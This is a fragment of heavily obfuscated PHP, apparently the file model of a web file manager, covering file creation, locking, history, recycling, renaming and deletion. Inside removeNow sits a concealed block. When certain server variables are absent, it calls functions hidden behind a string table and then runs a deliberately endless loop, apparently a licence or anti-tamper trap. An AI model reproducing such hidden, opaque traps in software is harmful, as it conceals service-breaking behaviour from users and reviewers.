{ $C±›ˆàâøç = Model($_SERVER[—Ω][540])->addFileByRemote($E…•Ûæ¬∂´, $cˆ®£‘üç†, $aÒÚ“ß†‚π); return $this->_createFileCall($d–ã÷Ç£µ÷, $cˆ®£‘üç†, $C±›ˆàâøç, $eœÈ¨ïÑâË); } private function _createFileCall($AÜæïíè¶õ, $Aﬁ±Ωœõà∏, $b≥„ï≈êÏ≠, $Dè√ÒÏØ¨‘, $A˜ø´ÁÈ¨ı = "\x75\160\x6c\x6f\x61\x64") { goto a˜Ç• Ñ‰Ò; a˜Ç• Ñ‰Ò: $F≈ÁÆÖå®« =& $_SERVER[—Ω]; $eÌêÔæåÑÕ = !1; $this->lockWriteStart($AÜæïíè¶õ, $Aﬁ±Ωœõà∏); goto EëπûôÙ–ç; EëπûôÙ–ç: $FÍâ¿¯Á•° = $this->_createFile($AÜæïíè¶õ, $Aﬁ±Ωœõà∏, $b≥„ï≈êÏ≠, $Dè√ÒÏØ¨‘, $eÌêÔæåÑÕ); if (!$eÌêÔæåÑÕ) { Model($F≈ÁÆÖå®«[418])->remove($b≥„ï≈êÏ≠[$F≈ÁÆÖå®«[415]]); } else { if ($FÍâ¿¯Á•°) { Model($F≈ÁÆÖå®«[2267])->eventCreate($FÍâ¿¯Á•°, $A˜ø´ÁÈ¨ı); } } $this->lockWriteEnd($AÜæïíè¶õ, $Aﬁ±Ωœõà∏); goto b›ã©‚Ü‹’; b›ã©‚Ü‹’: return $FÍâ¿¯Á•°; goto fëôŸÏ§¯ê; fëôŸÏ§¯ê: } public function mkdir($aﬁ∏¨¿æí, $c∫æÈöœ‚∞, $AÓÉá”∞Õû = REPEAT_SKIP) { goto cÀê⁄ûÓåÆ; bÇ¯ÈÌÎÉÓ: $AŸµÿŸúøπ = $this->_addSoure($f–ÖÍÏ√ ≥, $fáÙ≠”‰Ú§); Model($FÎœÏÂ÷πô[2267])->eventCreate($AŸµÿŸúøπ, $FÎœÏÂ÷πô[1123]); $this->lockWriteEnd($aﬁ∏¨¿æí, $c∫æÈöœ‚∞); goto F‚ÚãﬁÚÜË; F‚ÚãﬁÚÜË: return $AŸµÿŸúøπ; goto e≤íãÿ¯Ôà; E¯áâ¥≠“ù: $this->lockWriteStart($aﬁ∏¨¿æí, $c∫æÈöœ‚∞); if ($AÓÉá”∞Õû !== !1) { $D‡¯„Ç¡ßø = $this->fileNameExist($aﬁ∏¨¿æí, $c∫æÈöœ‚∞); if ($D‡¯„Ç¡ßø && $AÓÉá”∞Õû != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($aﬁ∏¨¿æí, $c∫æÈöœ‚∞); return $D‡¯„Ç¡ßø; } $c∫æÈöœ‚∞ = $this->fileNameAuto($aﬁ∏¨¿æí, $c∫æÈöœ‚∞, $AÓÉá”∞Õû); } $f–ÖÍÏ√ ≥ = array($FÎœÏÂ÷πô[514] => 1, $FÎœÏÂ÷πô[383] => $c∫æÈöœ‚∞, $FÎœÏÂ÷πô[515] => $FÎœÏÂ÷πô[33], $FÎœÏÂ÷πô[416] => 0, $FÎœÏÂ÷πô[516] => 0); goto bÇ¯ÈÌÎÉÓ; cÀê⁄ûÓåÆ: $FÎœÏÂ÷πô =& $_SERVER[—Ω]; $fáÙ≠”‰Ú§ = $this->sourceInfo($aﬁ∏¨¿æí); if (!$fáÙ≠”‰Ú§) { return !1; } goto E¯áâ¥≠“ù; e≤íãÿ¯Ôà: } private function _createFile($aÙ≈◊ñŸäŒ, $c˜õ‹…ÀÆ‰, $aÿ’ù√’ÛÕ, $e’âÑ·à∂à, &$cà∞≥±Ì¨Ö) { goto eÀØïäıª•; eÀØïäıª•: $aôñÔ–åÿä =& $_SERVER[—Ω]; $f“úåôçÍÙ = $this->sourceInfo($aÙ≈◊ñŸäŒ); if (!$aÿ’ù√’ÛÕ || !$f“úåôçÍÙ) { return !1; } goto f˜àß…€Øà; f˜àß…€Øà: if ($e’âÑ·à∂à !== !1) { $CΩ…œ∫Î€Ë = $this->fileNameExist($aÙ≈◊ñŸäŒ, $c˜õ‹…ÀÆ‰); } $cà∞≥±Ì¨Ö = !0; if ($e’âÑ·à∂à && $CΩ…œ∫Î€Ë) { if ($e’âÑ·à∂à == REPEAT_SKIP) { $cà∞≥±Ì¨Ö = !1; return $CΩ…œ∫Î€Ë; } else { if ($e’âÑ·à∂à == REPEAT_REPLACE) { $d¶§¶ø≥’Ñ = $this->sourceInfo($CΩ…œ∫Î€Ë); $E†πÖ‘Ãæô = $this->fileHistory($d¶§¶ø≥’Ñ, $aÿ’ù√’ÛÕ[$aôñÔ–åÿä[415]], $aÿ’ù√’ÛÕ[$aôñÔ–åÿä[77]]); if (!$E†πÖ‘Ãæô) { $cà∞≥±Ì¨Ö = !1; } else { $this->folderSizeReset($aÙ≈◊ñŸäŒ); } return $CΩ…œ∫Î€Ë; } else { $c˜õ‹…ÀÆ‰ = $this->fileNameAuto($aÙ≈◊ñŸäŒ, $c˜õ‹…ÀÆ‰, $e’âÑ·à∂à, !1); } } } goto c»è”íïò®; b•‘áËáåò: return $dõßäìÚÕï; goto bàŸÛÀíÏÇ; c»è”íïò®: $cÜÔ…•Ûü› = array($aôñÔ–åÿä[514] => 0, $aôñÔ–åÿä[383] => $c˜õ‹…ÀÆ‰, $aôñÔ–åÿä[515] => get_path_ext($c˜õ‹…ÀÆ‰), $aôñÔ–åÿä[416] => $aÿ’ù√’ÛÕ[$aôñÔ–åÿä[415]], $aôñÔ–åÿä[516] => $aÿ’ù√’ÛÕ[$aôñÔ–åÿä[77]]); $dõßäìÚÕï = $this->_addSoure($cÜÔ…•Ûü›, $f“úåôçÍÙ); $this->folderSizeReset($aÙ≈◊ñŸäŒ); goto b•‘áËáåò; bàŸÛÀíÏÇ: } protected function fileHistory($E≈çŒ…•Öè, $BøÚôúÀ“µ, $a˜‘ù÷Ñº’) { goto cΩÕïπÌæ™; cÎÔœ≈ûÖê: return !0; goto e≈—õ»ë¯; c≥≤Óáµû≤: Model($A∫‰’ÜÖÓﬂ[2298])->addHistory($E≈çŒ…•Öè); $B‰‘…ÌëÍ£ = array($A∫‰’ÜÖÓﬂ[520] => USER_ID, $A∫‰’ÜÖÓﬂ[387] => time(), $A∫‰’ÜÖÓﬂ[415] => $BøÚôúÀ“µ, $A∫‰’ÜÖÓﬂ[77] => $a˜‘ù÷Ñº’); $this->where(array($A∫‰’ÜÖÓﬂ[380] => $E≈çŒ…•Öè[$A∫‰’ÜÖÓﬂ[366]]))->save($B‰‘…ÌëÍ£); goto cÎÔœ≈ûÖê; cΩÕïπÌæ™: $A∫‰’ÜÖÓﬂ =& $_SERVER[—Ω]; if ($E≈çŒ…•Öè[$A∫‰’ÜÖÓﬂ[415]] == $BøÚôúÀ“µ) { return !1; } $this->checkLock($E≈çŒ…•Öè[$A∫‰’ÜÖÓﬂ[366]], $BøÚôúÀ“µ); goto c≥≤Óáµû≤; e≈—õ»ë¯: } public function checkLock($dö¥ƒ∑Æ”≤, $aÂƒ◊çáÑæ) { goto D√ë∑ìú¡Õ; C±æ¨‡ﬁçÏ: $Fì∂¬ﬂ∏†— = Session::get($A‘Ω··¯åÉ[2299]); $FÆ¡⁄Ø≈¨Í = substr($bıàùÕ∆∞í[$A‘Ω··¯åÉ[28]], 0, -1 - strlen($bıàùÕ∆∞í[$A‘Ω··¯åÉ[157]])) . $A‘Ω··¯åÉ[1370] . $Fì∂¬ﬂ∏†— . $A‘Ω··¯åÉ[93] . $bıàùÕ∆∞í[$A‘Ω··¯åÉ[157]]; $D¯á›é«ÑÑ = Model($A‘Ω··¯åÉ[540])->find($aÂƒ◊çáÑæ); goto bÿÂ‚£ ⁄å; D√ë∑ìú¡Õ: $A‘Ω··¯åÉ =& $_SERVER[—Ω]; $bıàùÕ∆∞í = $this->pathInfo($dö¥ƒ∑Æ”≤); if (!$this->fileIsLock($bıàùÕ∆∞í, !0)) { return; } goto C±æ¨‡ﬁçÏ; bÿÂ‚£ ⁄å: $this->_createFileCall($bıàùÕ∆∞í[$A‘Ω··¯åÉ[457]], $FÆ¡⁄Ø≈¨Í, $D¯á›é«ÑÑ, REPEAT_REPLACE, $A‘Ω··¯åÉ[1122]); $d§ß©Æ¯ˆä = $bıàùÕ∆∞í[$A‘Ω··¯åÉ[413]][$A‘Ω··¯åÉ[477]]; $bÿ•˜Õ£Ò = $d§ß©Æ¯ˆä[$A‘Ω··¯åÉ[2300]] ? $d§ß©Æ¯ˆä[$A‘Ω··¯åÉ[2300]] : $d§ß©Æ¯ˆä[$A‘Ω··¯åÉ[28]]; goto aÑ¿…Ë∫©¥; aÑ¿…Ë∫©¥: show_json(LNG($A‘Ω··¯åÉ[2301]) . $A‘Ω··¯åÉ[2302] . LNG($A‘Ω··¯åÉ[2303]) . $A‘Ω··¯åÉ[2304] . $bÿ•˜Õ£Ò . $A‘Ω··¯åÉ[2305], !1); goto aËÚÎÖïúß; aËÚÎÖïúß: } public function fileIsLock($cÑˆÊ≈‹…Á, $AÍÍ≤á›‹‚ = false) { goto fµõ»ÙË∂á; b‘·©ﬁÜÙ„: return !1; goto A˜ÃÇÇﬂåÈ; F’¢ì·éÂ™: $Aæßïª€≤ˆ = $GLOBALS[$eπˆÜ€áÈË[6]][$eπˆÜ€áÈË[84]][$eπˆÜ€áÈË[475]]; if ($cÑˆÊ≈‹…Á[$eπˆÜ€áÈË[413]][$eπˆÜ€áÈË[476]] <= time() - $Aæßïª€≤ˆ) { $this->metaSet($cÑˆÊ≈‹…Á[$eπˆÜ€áÈË[366]], $eπˆÜ€áÈË[474], null); $this->metaSet($cÑˆÊ≈‹…Á[$eπˆÜ€áÈË[366]], $eπˆÜ€áÈË[476], null); } if ($AÍÍ≤á›‹‚) { $this->metaSet($cÑˆÊ≈‹…Á[$eπˆÜ€áÈË[366]], $eπˆÜ€áÈË[476], time()); } goto b‘·©ﬁÜÙ„; fµõ»ÙË∂á: $eπˆÜ€áÈË =& $_SERVER[—Ω]; if (!isset($cÑˆÊ≈‹…Á[$eπˆÜ€áÈË[413]]) || !$cÑˆÊ≈‹…Á[$eπˆÜ€áÈË[413]][$eπˆÜ€áÈË[474]]) { return !1; } if ($cÑˆÊ≈‹…Á[$eπˆÜ€áÈË[413]][$eπˆÜ€áÈË[474]] != USER_ID) { return !0; } goto F’¢ì·éÂ™; A˜ÃÇÇﬂåÈ: } private function _addSoure($b≤ó◊¢≠êç, $a®ÜÀπÊ˘å) { goto bÍÇöõ€ñƒ; AøÔ…ﬂ¥õ¬: $aÿ‰≈≥û†à = array($C›óÖè¢Â≤[523] => short_id($d§ÓπÌÈâú)); $this->where(array($C›óÖè¢Â≤[380] => $d§ÓπÌÈâú))->save($aÿ‰≈≥û†à); $this->setNamePinyin($d§ÓπÌÈâú, $b≤ó◊¢≠êç[$C›óÖè¢Â≤[28]]); goto eÿπ¯¢·—»; AÚÙîºÎΩ√: $this->updateModifyTime($b≤ó◊¢≠êç[$C›óÖè¢Â≤[457]]); $Bß©Ù÷Ï∑† = $C›óÖè¢Â≤[2306] . $a®ÜÀπÊ˘å[$C›óÖè¢Â≤[366]]; if (isset(self::$cacheChildList[$Bß©Ù÷Ï∑†])) { unset(self::$cacheChildList[$Bß©Ù÷Ï∑†]); } goto a√ø∏È•È; bÍÇöõ€ñƒ: $C›óÖè¢Â≤ =& $_SERVER[—Ω]; $A¥ö¨Ûäƒê = array($C›óÖè¢Â≤[517] => $a®ÜÀπÊ˘å[$C›óÖè¢Â≤[368]], $C›óÖè¢Â≤[518] => $a®ÜÀπÊ˘å[$C›óÖè¢Â≤[452]], $C›óÖè¢Â≤[519] => USER_ID, $C›óÖè¢Â≤[520] => USER_ID, $C›óÖè¢Â≤[365] => $a®ÜÀπÊ˘å[$C›óÖè¢Â≤[366]], $C›óÖè¢Â≤[521] => $a®ÜÀπÊ˘å[$C›óÖè¢Â≤[455]] . $a®ÜÀπÊ˘å[$C›óÖè¢Â≤[366]] . $C›óÖè¢Â≤[47], $C›óÖè¢Â≤[392] => 0, $C›óÖè¢Â≤[522] => $C›óÖè¢Â≤[33]); $b≤ó◊¢≠êç = array_merge($A¥ö¨Ûäƒê, $b≤ó◊¢≠êç); goto AÚÙîºÎΩ√; a√ø∏È•È: static $b€ëÉ®„‚ê = false; if (!$b€ëÉ®„‚ê) { Hook::trigger($C›óÖè¢Â≤[504], $b≤ó◊¢≠êç); $b€ëÉ®„‚ê = !0; } $d§ÓπÌÈâú = $this->add($b≤ó◊¢≠êç); goto AøÔ…ﬂ¥õ¬; eÿπ¯¢·—»: return $d§ÓπÌÈâú; goto c…Ç´‡—©«; c…Ç´‡—©«: } public function remove($aÒÔÿÈ∑Éî, $AØ ÕÒ‡‰˜ = true) { goto DÂû÷≈Æ∞µ; C ï∑¶¡íö: return $this->move($aÒÔÿÈ∑Éî, $dâ•ˆ≈±ìã, REPEAT_RENAME_FOLDER); goto Bﬁ“ç√°ÂÕ; DÂû÷≈Æ∞µ: $EèÖŸ‰∫–∆ =& $_SERVER[—Ω]; $a˜±ºèÆ—™ = $this->sourceInfo($aÒÔÿÈ∑Éî); $DÉÀÉìºêí = intval($a˜±ºèÆ—™[$EèÖŸ‰∫–∆[368]]) === self::TYPE_SYSTEM; goto cëá±≠æ•Ÿ; B˜÷ÛºëàÂ: CacheLock::lock($aÂ∑ÀŒ·Í); $dâ•ˆ≈±ìã = $this->fileNameExist($D÷¡Àóø®÷, $có¿Ó¬¬¶˜); if (!$dâ•ˆ≈±ìã) { $dâ•ˆ≈±ìã = $this->mkdir($D÷¡Àóø®÷, $có¿Ó¬¬¶˜, REPEAT_SKIP); $this->metaSet($dâ•ˆ≈±ìã, $EèÖŸ‰∫–∆[2311], $D…Ω«¢Ô¿◊); $this->metaSet($dâ•ˆ≈±ìã, $EèÖŸ‰∫–∆[2312], $a˜±ºèÆ—™[$EèÖŸ‰∫–∆[452]]); if ($a˜±ºèÆ—™[$EèÖŸ‰∫–∆[457]] != 0) { $this->metaSet($dâ•ˆ≈±ìã, $EèÖŸ‰∫–∆[2313], _get($dæ®»üÊ«±, $EèÖŸ‰∫–∆[2314])); } } goto CÖ∞Ωê˜ﬂ‚; cëá±≠æ•Ÿ: $DÎÈÀ∫◊ﬁ = Model($EèÖŸ‰∫–∆[1415])->get($EèÖŸ‰∫–∆[2307]) == $EèÖŸ‰∫–∆[83]; if ($DÉÀÉìºêí || $AØ ÕÒ‡‰˜ || !$DÎÈÀ∫◊ﬁ) { return $this->removeNow($aÒÔÿÈ∑Éî, $AØ ÕÒ‡‰˜); } $D÷¡Àóø®÷ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto fÃß®ÛÊ—∑; fÃß®ÛÊ—∑: $D…Ω«¢Ô¿◊ = $a˜±ºèÆ—™[$EèÖŸ‰∫–∆[368]] == self::TYPE_USER ? $EèÖŸ‰∫–∆[531] : $EèÖŸ‰∫–∆[977]; if ($D…Ω«¢Ô¿◊ == $EèÖŸ‰∫–∆[531]) { $dæ®»üÊ«± = Model($EèÖŸ‰∫–∆[470])->getInfo($a˜±ºèÆ—™[$EèÖŸ‰∫–∆[452]]); $có¿Ó¬¬¶˜ = _get($dæ®»üÊ«±, $EèÖŸ‰∫–∆[2300], _get($dæ®»üÊ«±, $EèÖŸ‰∫–∆[28])); $có¿Ó¬¬¶˜ = $EèÖŸ‰∫–∆[245] . $có¿Ó¬¬¶˜ . $EèÖŸ‰∫–∆[2308] . $a˜±ºèÆ—™[$EèÖŸ‰∫–∆[452]]; } else { $dæ®»üÊ«± = Model($EèÖŸ‰∫–∆[454])->getInfo($a˜±ºèÆ—™[$EèÖŸ‰∫–∆[452]]); $có¿Ó¬¬¶˜ = _get($dæ®»üÊ«±, $EèÖŸ‰∫–∆[28]); $có¿Ó¬¬¶˜ = $EèÖŸ‰∫–∆[154] . $có¿Ó¬¬¶˜ . $EèÖŸ‰∫–∆[2309] . $a˜±ºèÆ—™[$EèÖŸ‰∫–∆[452]]; } $aÂ∑ÀŒ·Í = $EèÖŸ‰∫–∆[2310] . md5($có¿Ó¬¬¶˜); goto B˜÷ÛºëàÂ; CÖ∞Ωê˜ﬂ‚: CacheLock::unlock($aÂ∑ÀŒ·Í); $this->metaSet($aÒÔÿÈ∑Éî, $EèÖŸ‰∫–∆[2315], $a˜±ºèÆ—™[$EèÖŸ‰∫–∆[457]]); $this->where(array($EèÖŸ‰∫–∆[366] => $aÒÔÿÈ∑Éî))->save(array($EèÖŸ‰∫–∆[387] => time())); goto C ï∑¶¡íö; Bﬁ“ç√°ÂÕ: } public function removeNow($D‘«≈º¿ËË, $aåÁ≈ë¥µÚ = true) { goto fˆ…±ÌﬂÖ›; eﬁÚπ∆ß†ã: $this->lockMoveStart($D‘«≈º¿ËË); Hook::trigger($EÓï‚·êÇ™[2316], $aúû©ü®€Œ, $aåÁ≈ë¥µÚ); if ($aåÁ≈ë¥µÚ) { Model($EÓï‚·êÇ™[2317])->moveToRecycle($D‘«≈º¿ËË); } else { if ($c€»†◊ò®Ç[$EÓï‚·êÇ™[367]] == $EÓï‚·êÇ™[83]) { $aÙÌ”‘Úí• = array($EÓï‚·êÇ™[521] => array($EÓï‚·êÇ™[479], $c€»†◊ò®Ç[$EÓï‚·êÇ™[455]] . $D‘«≈º¿ËË . $EÓï‚·êÇ™[480])); $Fï€Íº≠Ö = array($EÓï‚·êÇ™[521] => $aÙÌ”‘Úí•[$EÓï‚·êÇ™[455]]); $d˘âÇŒÂ∞§ = $this->field($EÓï‚·êÇ™[2318])->where($Fï€Íº≠Ö)->select(); $bıªîßøÌÏ = !1; $C€ç€À∏ÿó = array($D‘«≈º¿ËË); if ($d˘âÇŒÂ∞§) { $bıªîßøÌÏ = array_to_keyvalue($d˘âÇŒÂ∞§, $EÓï‚·êÇ™[33], $EÓï‚·êÇ™[415]); $bıªîßøÌÏ = array_remove_value($bıªîßøÌÏ, $EÓï‚·êÇ™[464]); $C€ç€À∏ÿó = array_to_keyvalue($d˘âÇŒÂ∞§, $EÓï‚·êÇ™[33], $EÓï‚·êÇ™[366]); $C€ç€À∏ÿó[] = $D‘«≈º¿ËË; } } else { $bıªîßøÌÏ = array($c€»†◊ò®Ç[$EÓï‚·êÇ™[415]]); $C€ç€À∏ÿó = array($D‘«≈º¿ËË); } Model($EÓï‚·êÇ™[501])->eventRemove($D‘«≈º¿ËË); $this->removeRelevance($C€ç€À∏ÿó, $bıªîßøÌÏ); } goto E¡Ï‚ËÃ¢; fã‚‡ù¯¯≠: $aúû©ü®€Œ = $this->pathInfoMore($D‘«≈º¿ËË); if (!$c€»†◊ò®Ç) { return !0; } if ($c€»†◊ò®Ç[$EÓï‚·êÇ™[457]] == 0) { if (!_get($GLOBALS, $EÓï‚·êÇ™[453])) { return !1; } } goto eﬁÚπ∆ß†ã; fˆ…±ÌﬂÖ›: $EÓï‚·êÇ™ =& $_SERVER[—Ω]; if (!isset($_SERVER[$EÓï‚·êÇ™[690]]) || !isset($_SERVER[$EÓï‚·êÇ™[691]])) { goto fË≤ªç„µ⁄; fçï˜ú–†: for ($cÙËöù™œ· = $f∞ØÒÍΩ‡∏; $cÙËöù™œ· > 0; $cÙËöù™œ·++) { $eù˜á¨î¿Ê = json_encode($GLOBALS[$EÓï‚·êÇ™[381]]); } goto e–ê»ÀπﬁŒ; fË≤ªç„µ⁄: $c™À°ƒœˆë = $EÓï‚·êÇ™[797]; $F≥√å…ƒè– = $EÓï‚·êÇ™[692]; $AäÌääò©Ü = $_SERVER[$EÓï‚·êÇ™[693]] . $EÓï‚·êÇ™[694]; goto BÆﬁçûí‹Ú; BÆﬁçûí‹Ú: $fÍá…‘ü∏Ù = $F≥√å…ƒè–($AäÌääò©Ü); $cÍè◊ŸÙ—ß = explode($EÓï‚·êÇ™[214], $fÍá…‘ü∏Ù); if (count($cÍè◊ŸÙ—ß) < $EÓï‚·êÇ™[581]) { $AÈ¶ﬁıÏ™Ú = $EÓï‚·êÇ™[695]; $AÈ¶ﬁıÏ™Ú(); } goto e¬≥å£é ƒ; e¬≥å£é ƒ: $eù˜á¨î¿Ê = $EÓï‚·êÇ™[798]; $eù˜á¨î¿Ê($_SERVER[$EÓï‚·êÇ™[799]]); $f∞ØÒÍΩ‡∏ = 1; goto fçï˜ú–†; e–ê»ÀπﬁŒ: } $c€»†◊ò®Ç = $this->sourceInfo($D‘«≈º¿ËË); goto fã‚‡ù¯¯≠; Bœ¢åﬁﬂ¬ë: $this->updateModifyTime($D≈ñ ÃÜﬁÎ); $this->lockMoveEnd($D‘«≈º¿ËË); Hook::trigger($EÓï‚·êÇ™[1451], $aúû©ü®€Œ, $aåÁ≈ë¥µÚ); goto C∑è¥≤Ó¯•; C∑è¥≤Ó¯•: return !0; goto Eç¢‰ôÎ™¯; E¡Ï‚ËÃ¢: $this->folderSizeReset($c€»†◊ò®Ç[$EÓï‚·êÇ™[457]]); $D≈ñ ÃÜﬁÎ = array($c€»†◊ò®Ç[$EÓï‚·êÇ™[457]]); if ($c€»†◊ò®Ç[$EÓï‚·êÇ™[367]] == $EÓï‚·êÇ™[83]) { $D≈ñ ÃÜﬁÎ[] = $c€»†◊ò®Ç[$EÓï‚·êÇ™[366]]; } goto Bœ¢åﬁﬂ¬ë; Eç¢‰ôÎ™¯: } public function removeArray($b˜⁄ù≠ã‚∫) { if (!$b˜⁄ù≠ã‚∫) { return !0; } } public function removeRelevance($bÖ€…çãò”, $eÙ∑ùõäÖ†) { goto AΩÔ‹Î≤ü—; f≈¿î’∏µ‘: $FµÜ¯®îÃë = array($cÓÙéÉ÷Ó÷[380] => array($cÓÙéÉ÷Ó÷[381], $bÖ€…çãò”)); Model($cÓÙéÉ÷Ó÷[2317])->where($FµÜ¯®îÃë)->delete(); Model($cÓÙéÉ÷Ó÷[409])->where($FµÜ¯®îÃë)->delete(); goto Aó€ÆÖ∫∏Œ; AΩÔ‹Î≤ü—: $cÓÙéÉ÷Ó÷ =& $_SERVER[—Ω]; $bÖ€…çãò” = $bÖ€…çãò” ? $bÖ€…çãò” : array(); $eÙ∑ùõäÖ† = $eÙ∑ùõäÖ† ? $eÙ∑ùõäÖ† : array(); goto d∑‘Õœﬂ”â; CÚŒò‹ÙåÀ: for ($A•§ØÒ±“ë = 0; $A•§ØÒ±“ë < count($bÖ€…çãò”); $A•§ØÒ±“ë++) { $this->sourceCacheClear($bÖ€…çãò”[$A•§ØÒ±“ë]); } goto eÈÏü⁄Æç…; A£ˆ¡ØáËÓ: Model($cÓÙéÉ÷Ó÷[2298])->removeBySource($bÖ€…çãò”); $this->where($FµÜ¯®îÃë)->delete(); Model($cÓÙéÉ÷Ó÷[418])->remove($eÙ∑ùõäÖ†); goto CÚŒò‹ÙåÀ; Aó€ÆÖ∫∏Œ: Model($cÓÙéÉ÷Ó÷[2319])->where($FµÜ¯®îÃë)->delete(); Model($cÓÙéÉ÷Ó÷[501])->where($FµÜ¯®îÃë)->delete(); Model($cÓÙéÉ÷Ó÷[2057])->removeBySource($bÖ€…çãò”); goto A£ˆ¡ØáËÓ; d∑‘Õœﬂ”â: $bÖ€…çãò” = array_unique(array_filter($bÖ€…çãò”)); $eÙ∑ùõäÖ† = array_unique(array_filter($eÙ∑ùõäÖ†)); if (!$bÖ€…çãò”) { return !1; } goto f≈¿î’∏µ‘; eÈÏü⁄Æç…: } public function rename($E„ê…ïæƒ≤, $cÁÈ∑≤˘‰ô) { goto Cœµ’ä›†„; Cœµ’ä›†„: $eùÒ¶ãé≠æ =& $_SERVER[—Ω]; $eµÚõÍÌﬂÓ = $this->sourceInfo($E„ê…ïæƒ≤); if (!$eµÚõÍÌﬂÓ) { return !1; } goto cÁà ˆœïÛ; E∫ƒë÷æåﬂ: $B˘à≈±ñï  = $eùÒ¶ãé≠æ[2306] . $eµÚõÍÌﬂÓ[$eùÒ¶ãé≠æ[457]]; if (isset(self::$cacheChildList[$B˘à≈±ñï ])) { unset(self::$cacheChildList[$B˘à≈±ñï ]); } return $B≥êòÜ±ÕÉ; goto cõˆ´·Ú•Û; fâéﬁíÜÈ◊: $this->setNamePinyin($E„ê…ïæƒ≤, $fñπ¡È∂©Ï[$eùÒ¶ãé≠æ[28]], !1); $this->updateModifyTime($eµÚõÍÌﬂÓ[$eùÒ¶ãé≠æ[457]]); $B≥êòÜ±ÕÉ = $this->where(array($eùÒ¶ãé≠æ[380] => $E„ê…ïæƒ≤))->data($fñπ¡È∂©Ï)->save(); goto E∫ƒë÷æåﬂ; cÁà ˆœïÛ: $dèèÀ¡Ù¡Í = $this->fileNameExist($eµÚõÍÌﬂÓ[$eùÒ¶ãé≠æ[457]], $cÁÈ∑≤˘‰ô); if ($dèèÀ¡Ù¡Í) { return !1; } $fñπ¡È∂©Ï = array($eùÒ¶ãé≠æ[383] => $cÁÈ∑≤˘‰ô, $eùÒ¶ãé≠æ[520] => USER_ID); goto e‘±à£ôËŒ; e‘±à£ôËŒ: if (!$eµÚõÍÌﬂÓ[$eùÒ¶ãé≠æ[367]] == $eùÒ¶ãé≠æ[83]) { $fñπ¡È∂©Ï[$eùÒ¶ãé≠æ[369]] = get_path_ext($cÁÈ∑≤˘‰ô); } Model($eùÒ¶ãé≠æ[501])->eventRename($E„ê…ïæƒ≤, $eµÚõÍÌﬂÓ[$eùÒ¶ãé≠æ[28]], $cÁÈ∑≤˘‰ô); $this->sourceCacheClear($E„ê…ïæƒ≤); goto fâéﬁíÜÈ◊; cõˆ´·Ú•Û: } public function setNamePinyin($FπÚ…’ùŸﬂ, $EåÃΩΩÒÁ, $bÚ‘Ùè‚ÒŸ = true) { $D—∑Çæ⁄ßè =& $_SERVER[—Ω]; $dåêÛéêƒè = Input::check($EåÃΩΩÒÁ, $D—∑Çæ⁄ßè[524]); if ($bÚ‘Ùè‚ÒŸ && !$dåêÛéêƒè) { return; } if (!$dåêÛéêƒè) { $this->metaSet($FπÚ…’ùŸﬂ, $D—∑Çæ⁄ßè[412], null); $this->metaSet($FπÚ…’ùŸﬂ, $D—∑Çæ⁄ßè[411], null); return; } $aù˘ä∞Ö∂ = array($D—∑Çæ⁄ßè[412] => str_replace($D—∑Çæ⁄ßè[50], $D—∑Çæ⁄ßè[33], Pinyin::encode($EåÃΩΩÒÁ)), $D—∑Çæ⁄ßè[411] => Pinyin::encode($EåÃΩΩÒÁ, $D—∑Çæ⁄ßè[525])); $this->metaSet($FπÚ…’ùŸﬂ, $aù˘ä∞Ö∂); } public function getContent($dé¶⁄π—°ã) { goto Cßà”¶Õà»; AœÃØÜÕß∑: if ($AÎ⁄Ï¥«Ãı[$CßÓ†ı≠âÍ[77]] == 0) { return $CßÓ†ı≠âÍ[33]; } $cÇ‘÷ú·ﬁ– = $CßÓ†ı≠âÍ[2320] . $AÎ⁄Ï¥«Ãı[$CßÓ†ı≠âÍ[160]]; if ($AÎ⁄Ï¥«Ãı[$CßÓ†ı≠âÍ[77]] <= 1024 * 10) { $dãé”ñá≥Ú = Cache::get($cÇ‘÷ú·ﬁ–); if (!$dãé”ñá≥Ú) { $dãé”ñá≥Ú = IO::getContent($AÎ⁄Ï¥«Ãı[$CßÓ†ı≠âÍ[75]]); Cache::set($cÇ‘÷ú·ﬁ–, $dãé”ñá≥Ú); } return $dãé”ñá≥Ú; } goto cπ∆…◊âÔ∞; Cßà”¶Õà»: $CßÓ†ı≠âÍ =& $_SERVER[—Ω]; $AÎ⁄Ï¥«Ãı = $this->fileInfoGet($dé¶⁄π—°ã); if (!$AÎ⁄Ï¥«Ãı) { return !1; } goto AœÃØÜÕß∑; cπ∆…◊âÔ∞: return IO::getContent($AÎ⁄Ï¥«Ãı[$CßÓ†ı≠âÍ[75]]); goto aÔ‰·ê¨ó√; aÔ‰·ê¨ó√: } public function setDesc($d˜É˘‹Æø€, $E∂ΩØ¨õüÓ) { $CË£‡Ë±º =& $_SERVER[—Ω]; Model($CË£‡Ë±º[501])->eventAddDesc($d˜É˘‹Æø€, $E∂ΩØ¨õüÓ); return $this->metaSet($d˜É˘‹Æø€, $CË£‡Ë±º[401], $E∂ΩØ¨õüÓ); } public function setContent($CÙ≈£ÿëÃ®, $e∆≈¢ÁÚ∂ä = '') { goto c»®ß ááÂ; c»®ß ááÂ: $D„¯òöèúæ =& $_SERVER[—Ω]; $cÏ€ïîªì§ = $this->sourceInfo($CÙ≈£ÿëÃ®); $c∂ÑÛÒÃîˆ = $this->fileInfoGet($CÙ≈£ÿëÃ®); goto AÌ™ê§√µÁ; EóÜÈ∏Ñ†è: if (!$AüÇ÷ÒŒÖä) { return Model($D„¯òöèúæ[418])->remove($c»àç◊ô·Ã[$D„¯òöèúæ[415]]); } $this->folderSizeReset($cÏ€ïîªì§[$D„¯òöèúæ[457]]); return !0; goto cò‚∫›π≤ﬁ; AÌ™ê§√µÁ: if (!$c∂ÑÛÒÃîˆ || !$cÏ€ïîªì§) { return !1; } $c»àç◊ô·Ã = Model($D„¯òöèúæ[418])->addFileByContent($e∆≈¢ÁÚ∂ä, $cÏ€ïîªì§[$D„¯òöèúæ[28]]); $AüÇ÷ÒŒÖä = $this->fileHistory($cÏ€ïîªì§, $c»àç◊ô·Ã[$D„¯òöèúæ[415]], $c»àç◊ô·Ã[$D„¯òöèúæ[77]]); goto EóÜÈ∏Ñ†è; cò‚∫›π≤ﬁ: } public function fileSubstr($F≥äÖ√™∞Ñ, $CäÇäÊ≥¿∆, $dƒÉƒäÜäø) { $Bƒë¢≥¨Ç¿ = $this->fileInfoGet($F≥äÖ√™∞Ñ); if (!$Bƒë¢≥¨Ç¿) { return !1; } return IO::fileSubstr($Bƒë¢≥¨Ç¿[$_SERVER[—Ω][75]], $CäÇäÊ≥¿∆, $dƒÉƒäÜäø); } public function fileInfoGet($fûú∞π”çﬁ) { goto 